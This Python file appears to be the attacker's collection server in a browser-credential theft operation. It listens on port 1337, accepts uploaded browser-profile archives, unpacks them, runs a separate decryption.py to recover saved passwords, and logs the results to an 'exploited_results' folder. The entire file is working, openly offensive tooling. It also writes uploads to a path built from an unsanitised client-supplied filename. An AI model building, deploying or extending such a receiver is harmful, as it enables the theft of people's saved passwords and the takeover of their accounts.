import os
import tarfile
import subprocess
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer

SAVE_DIR = "received_files"
EXTRACT_DIR = "extracted_files"
RESULT_DIR = "exploited_results"

os.makedirs(SAVE_DIR, exist_ok=True)
os.makedirs(EXTRACT_DIR, exist_ok=True)
os.makedirs(RESULT_DIR, exist_ok=True)

def log(level, message):
    print(f"[{level.upper()}] {message}")

class SimpleHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        # Bước 1: Nhận file .tar.gz và lưu vào thư mục received_files
        content_length = int(self.headers.get('Content-Length', 0))
        filename = self.headers.get('X-Filename', f"profile_{datetime.now().timestamp()}.tar.gz")
        filepath = os.path.join(SAVE_DIR, filename)

        try:
            with open(filepath, 'wb') as f:
                f.write(self.rfile.read(content_length))
            log("info", f"File saved to: {filepath}")
        except Exception as e:
            log("error", f"Failed to save file: {e}")
            self.send_response(500)
            self.end_headers()
            return

        # Bước 2: Giải nén file .tar.gz và lưu vào thư mục extracted_files
        try:
            with tarfile.open(filepath, "r:gz") as tar:
                tar.extractall(path=EXTRACT_DIR, filter="data")
            log("info", f"Extracted to: {EXTRACT_DIR}")
        except Exception as e:
            log("error", f"Extraction failed: {e}")
            self.send_response(500)
            self.end_headers()
            return

        # Bước 3: Chạy script decryption.py với tham số -d
        # DEBUG: python decryption.py -d <directory> [-p <master password>]
        try:
            process = subprocess.run(
                ["python", "decryption.py", "-d", EXTRACT_DIR],
                capture_output=True,
                text=True
            )
            result_output = process.stdout.strip()
            log("info", "Decryption results:")
            print(result_output if result_output else log("fail", 'Primary Password required!'))
        except Exception as e:
            log("error", f"Decryption script failed to run: {e}")
            self.send_response(500)
            self.end_headers()
            return

        # Bước 4: Lưu kết quả vào thư mục exploited_results
        try:
            log_file = os.path.join(RESULT_DIR, "log.txt")
            if not result_output:
                result_output = "Primary Password required!"
            with open(log_file, 'a') as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n{result_output}\n\n")
            log("info", f"Log saved to: {log_file}")
        except Exception as e:
            log("error", f"Failed to write log: {e}")

        # Bước 5: Gửi HTTP 200 OK
        self.send_response(200)
        self.end_headers()

if __name__ == '__main__':
    log("info", "Listening on port 1337...")
    server = HTTPServer(('0.0.0.0', 1337), SimpleHandler)
    server.serve_forever()